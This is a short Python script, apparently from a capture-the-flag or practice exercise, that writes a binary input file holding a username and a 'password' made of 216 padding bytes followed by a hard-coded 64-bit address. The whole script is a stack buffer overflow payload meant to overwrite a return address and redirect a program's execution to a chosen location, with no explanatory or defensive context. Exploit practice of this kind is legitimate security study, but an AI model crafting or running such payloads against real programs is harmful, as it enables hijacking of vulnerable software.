username = b"amin\n"
password = b"A" * 216 + b"\x88\x12\x40\x00\x00\x00\x00\x00" 

with open("combined_input_show.bin", "wb") as f:
    f.write(username + password)
